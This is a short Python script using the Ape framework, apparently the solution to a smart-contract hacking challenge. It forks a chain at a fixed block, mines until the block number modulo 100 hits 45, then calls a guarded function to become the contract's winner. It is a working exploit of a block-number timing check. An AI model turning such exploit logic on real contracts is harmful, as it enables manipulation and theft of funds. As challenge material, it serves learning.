from ape import accounts, Contract
from .utils.helper import fork, get_block, mine_block, reverts

BLOCK = 7335615
HACKABLE_CONTRACT = "0x445D0FA7FA12A85b30525568DFD09C3002F2ADe5"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    hackable = Contract(HACKABLE_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # we could also use flashbots to send a tx at a specific block number
    # but flashbots does not integrate well with Ape yet
    while True:
        if (get_block() + 1) % 100 == 45:
            hackable.cantCallMe(sender=attacker)
            break
        else:
            mine_block(1)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You are now the winner of the contract ---\n")

    assert hackable.winner() == attacker.address
    with reverts("Already done"):
        hackable.cantCallMe(sender=attacker)

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
